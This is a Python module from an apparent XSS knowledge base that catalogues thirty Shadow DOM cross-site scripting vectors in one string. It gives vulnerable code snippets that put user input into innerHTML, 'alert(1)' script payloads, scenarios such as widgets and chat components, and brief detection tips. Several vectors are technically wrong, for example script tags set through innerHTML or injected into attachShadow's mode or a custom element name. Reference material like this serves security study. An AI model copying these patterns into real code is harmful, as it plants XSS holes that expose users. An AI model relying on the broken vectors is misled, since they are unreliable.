#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

Cross-Site Scripting (XSS) in Shadow DOM Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
SHADOW DOM XSS ATTACK VECTORS:

1. SLOT CONTENT INJECTION:
   Custom element with slot:
   <user-profile>
     <span slot="name">USER_INPUT</span>  <!-- Slot injection -->
   </user-profile>

   Component template:
   <template>
     <div class="profile">
       <h2><slot name="name"></slot></h2>  <!-- XSS in slot -->
     </div>
   </template>

2. SHADOW DOM INNER HTML INJECTION:
   Direct shadow DOM manipulation:
   const shadow = element.attachShadow({mode: 'open'});
   shadow.innerHTML = USER_INPUT;  // Direct injection

3. CUSTOM ELEMENT ATTRIBUTE INJECTION:
   Custom element attributes:
   <my-component title="USER_INPUT"></my-component>

   Component code:
   connectedCallback() {
     this.shadowRoot.innerHTML = '<h1>' + this.getAttribute('title') + '</h1>';
   }

4. TEMPLATE SLOT INJECTION:
   Template with dynamic slots:
   const template = document.createElement('template');
   template.innerHTML = USER_INPUT;  <!-- Template injection -->

   const shadow = element.attachShadow({mode: 'open'});
   shadow.appendChild(template.content.cloneNode(true));

5. SHADOW ROOT MODE MANIPULATION:
   Shadow root mode injection:
   const shadow = element.attachShadow({
     mode: USER_INPUT  // Mode injection
   });

   Attack payload:
   'open<script>alert(1)</script>'

ADVANCED SHADOW DOM XSS TECHNIQUES:

6. CUSTOM ELEMENT TAG NAME INJECTION:
   Creating elements with XSS names:
   const tagName = USER_INPUT;  // Tag name injection
   customElements.define(tagName, MyComponent);

   Attack payload:
   <script>alert(1)</script>

7. CONSTRUCTOR INJECTION:
   Custom element constructor injection:
   class MaliciousComponent extends HTMLElement {
     constructor() {
       super();
       this.shadowRoot.innerHTML = USER_INPUT;  // Constructor injection
     }
   }

8. ATTRIBUTE OBSERVER INJECTION:
   Mutation observer with XSS:
   const observer = new MutationObserver(function(mutations) {
     mutations.forEach(function(mutation) {
       if (mutation.type === 'attributes') {
         const value = mutation.target.getAttribute('data-user');
         this.shadowRoot.getElementById('display').innerHTML = value;  // XSS
       }
     });
   });

9. EVENT LISTENER INJECTION:
   Event delegation across shadow boundaries:
   element.addEventListener('click', function(event) {
     const target = event.target;
     if (target.matches(USER_INPUT)) {  // Selector injection
       // XSS execution
     }
   });

10. CSS CUSTOM PROPERTY INJECTION:
    Shadow DOM styles with XSS:
    const style = document.createElement('style');
    style.textContent = ':host { --user-color: ' + USER_INPUT + '; }';  // CSS injection

    this.shadowRoot.appendChild(style);

11. SHADOW DOM QUERY SELECTOR INJECTION:
    Querying shadow DOM with XSS:
    const selector = USER_INPUT;  // Selector injection
    const elements = this.shadowRoot.querySelectorAll(selector);

12. FRAGMENT DIRECTIVE INJECTION:
    Shadow DOM template fragments:
    const template = document.createElement('template');
    template.innerHTML = '<div>' + USER_INPUT + '</div>';  // Fragment injection

13. SHADOW ROOT ADOPTION:
    Adopting shadow trees with XSS:
    const shadowTree = document.createElement('div');
    shadowTree.innerHTML = USER_INPUT;  // Tree injection

    const shadow = element.attachShadow({mode: 'open'});
    shadow.appendChild(shadowTree);

14. CUSTOM ELEMENT REGISTRY INJECTION:
    Global registry manipulation:
    const componentName = USER_INPUT;  // Component name injection
    customElements.define(componentName, MaliciousComponent);

15. SHADOW BOUNDARY CROSSING:
    Crossing shadow boundaries:
    const host = document.querySelector('my-component');
    const shadow = host.shadowRoot;

    // Inject into shadow from outside
    const slot = shadow.querySelector('slot');
    slot.innerHTML = USER_INPUT;  // Boundary crossing

SHADOW DOM-SPECIFIC BYPASSES:

16. CLOSED SHADOW DOM ESCAPE:
    Escaping closed shadow boundaries:
    const shadow = element.attachShadow({mode: 'closed'});
    shadow.innerHTML = USER_INPUT;  // Still vulnerable to injection

17. TEMPLATE CLONING ATTACK:
    Template cloning with XSS:
    const template = document.createElement('template');
    template.innerHTML = '<div><slot></slot></div>';

    const clone = template.content.cloneNode(true);
    clone.querySelector('slot').innerHTML = USER_INPUT;  // Clone injection

18. FRAGMENT COMPOSITION:
    Multiple fragments with coordinated attack:
    fragment1.innerHTML = '<div>';
    fragment2.innerHTML = USER_INPUT;  // XSS fragment
    fragment3.innerHTML = '</div>';

19. ATTRIBUTE REFLECTION:
    Reflecting attributes through shadow DOM:
    const attribute = element.getAttribute('data-user');
    this.shadowRoot.innerHTML = '<span data-value="' + attribute + '"></span>';

20. EVENT BUBBLING MANIPULATION:
    Event bubbling through shadow boundaries:
    this.shadowRoot.addEventListener('custom-event', function(event) {
      document.body.innerHTML = event.detail.data;  // XSS through events
    });

REAL-WORLD ATTACK SCENARIOS:

21. UI COMPONENT LIBRARY:
    - Third-party component library
    - Component props: <script>alert(1)</script>
    - Rendered in shadow DOM
    - Affects all library users

22. WIDGET PLATFORM:
    - Embeddable widgets
    - Widget config: <script>alert(1)</script>
    - Widget rendered in shadow DOM
    - Affects all widget consumers

23. PLUGIN SYSTEM:
    - Browser extension plugins
    - Plugin manifest: <script>alert(1)</script>
    - Plugin UI in shadow DOM
    - Extension compromise

24. WEB COMPONENT FRAMEWORK:
    - Lit, FAST, or Stencil components
    - Component properties: <script>alert(1)</script>
    - Template rendering
    - Framework-wide XSS

25. DASHBOARD WIDGETS:
    - Configurable dashboard
    - Widget title: <script>alert(1)</script>
    - Widget content in shadow DOM
    - Dashboard compromise

26. FORM BUILDER:
    - Dynamic form generation
    - Field label: <script>alert(1)</script>
    - Form fields in shadow DOM
    - Form submission hijacking

27. CHAT WIDGET:
    - Live chat component
    - User message: <script>alert(1)</script>
    - Message display in shadow DOM
    - Chat session hijacking

SHADOW DOM XSS DETECTION:

28. MANUAL TESTING:
    - DevTools Elements inspection
    - Shadow DOM expansion in DevTools
    - Component property testing
    - Event listener monitoring

29. AUTOMATED SCANNING:
    - Shadow DOM tree traversal
    - Component property injection
    - Template analysis
    - Encapsulation testing

30. BROWSER EXTENSIONS:
    - Shadow DOM inspection tools
    - Component analysis extensions
    - DOM tree visualization
"""
